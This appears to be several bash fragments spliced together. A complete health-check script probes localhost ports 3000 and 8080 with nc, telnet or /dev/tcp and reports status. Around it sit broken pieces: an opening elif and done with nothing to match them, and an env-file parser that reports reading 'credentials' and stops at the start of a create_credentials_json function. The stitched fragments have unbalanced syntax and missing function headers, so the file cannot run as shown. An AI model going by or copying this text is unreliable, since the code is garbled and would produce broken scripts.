    elif [[ "$http_code" != "000" ]]; then

        echo -e "  Response: $response_body"

    done

#!/bin/bash

# Health check script for services on ports 3000 and 8080
# This script checks if services are responding on the specified ports
# and reports their status.

# Function to check if a service is running on a specific port
check_port() {
    local port=$1
    local service_name=$2
    
    # Try to connect to the port
    if command -v nc >/dev/null 2>&1; then
        # Using netcat if available
        if nc -z localhost $port 2>/dev/null; then
            echo "✅ Service $service_name (port $port): RUNNING"
            return 0
        else
            echo "❌ Service $service_name (port $port): NOT RUNNING"
            return 1
        fi
    elif command -v telnet >/dev/null 2>&1; then
        # Using telnet as fallback
        timeout 2 telnet localhost $port 2>&1 | grep -q "Connected"
        if [ $? -eq 0 ]; then
            echo "✅ Service $service_name (port $port): RUNNING"
            return 0
        else
            echo "❌ Service $service_name (port $port): NOT RUNNING"
            return 1
        fi
    else
        # Using bash built-in TCP connections (Bash 4+)
        if timeout 2 bash -c "echo > /dev/tcp/localhost/$port" 2>/dev/null; then
            echo "✅ Service $service_name (port $port): RUNNING"
            return 0
        else
            echo "❌ Service $service_name (port $port): NOT RUNNING"
            return 1
        fi
    fi
}

# Function to get service status with more details
get_service_status() {
    local port=$1
    local service_name=$2
    
    echo "Checking $service_name on port $port..."
    echo "======================================"
    
    # Check if port is in use
    if command -v ss >/dev/null 2>&1; then
        echo "Port $port usage:"
        ss -tlnp | grep ":$port " || echo "  No process listening on port $port"
    elif command -v netstat >/dev/null 2>&1; then
        echo "Port $port usage:"
        netstat -tlnp 2>/dev/null | grep ":$port " || echo "  No process listening on port $port"
    fi
    
    echo ""
}

# Main execution
main() {
    echo "🔍 Starting health check..."
    echo "============================="
    echo "Timestamp: $(date)"
    echo ""
    
    # Check the specified ports
    port_3000_running=0
    port_8080_running=0
    
    # Check port 3000
    echo "1. Checking port 3000:"
    check_port 3000 "Web App"
    port_3000_running=$?
    get_service_status 3000 "Web App"
    
    echo "2. Checking port 8080:"
    check_port 8080 "API Server"
    port_8080_running=$?
    get_service_status 8080 "API Server"
    
    # Summary
    echo "📊 HEALTH CHECK SUMMARY"
    echo "========================"
    
    if [ $port_3000_running -eq 0 ]; then
        echo "✅ Port 3000: Healthy"
    else
        echo "❌ Port 3000: Unhealthy"
    fi
    
    if [ $port_8080_running -eq 0 ]; then
        echo "✅ Port 8080: Healthy"
    else
        echo "❌ Port 8080: Unhealthy"
    fi
    
    # Overall status
    echo ""
    if [ $port_3000_running -eq 0 ] && [ $port_8080_running -eq 0 ]; then
        echo "🎉 ALL SERVICES ARE RUNNING"
        exit 0
    elif [ $port_3000_running -eq 0 ] || [ $port_8080_running -eq 0 ]; then
        echo "⚠️  SOME SERVICES ARE RUNNING"
        exit 1
    else
        echo "💥 NO SERVICES ARE RUNNING"
        exit 2
    fi
}

# Check if we're being sourced or executed
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi

# Global arrays for environment variables

        echo "⚠️  Warning: $env_file not found"
        return 1

    # Clear arrays
    if declare -p env_vars 2>/dev/null | grep -q 'declare -A'; then
        for key in "${!env_vars[@]}"; do
            unset env_vars["$key"]
        done
    fi
    env_vars_list=()
    
    # Read all key-value pairs, skipping comments and empty lines
    while IFS='=' read -r key value || [ -n "$key" ]; do
        # Skip comments and empty lines
        [[ $key =~ ^#.*$ ]] && continue
        [[ -z "$key" ]] && continue
        
        # Remove quotes if present
        value="${value%%#*}"  # Remove inline comments
        value="${value//\"}"  # Remove double quotes
        value="${value//\'}"  # Remove single quotes
        value="${value%"${value##*[![:space:]]}"}"  # Trim trailing spaces
        
        if [ -n "$key" ] && [ -n "$value" ]; then
            # Store in associative array if supported, otherwise use indexed array
            if declare -p env_vars 2>/dev/null | grep -q 'declare -A'; then
                env_vars["$key"]="$value"
            else
                env_vars_list+=("$key=$value")
            fi
        fi
    done < "$env_file"
    
    local count
    if declare -p env_vars 2>/dev/null | grep -q 'declare -A'; then
        count=${#env_vars[@]}
    else
        count=${#env_vars_list[@]}
    fi
    
    echo "📄 Read $count credentials from $env_file"
    return 0
}

create_credentials_json() {
    local json=""
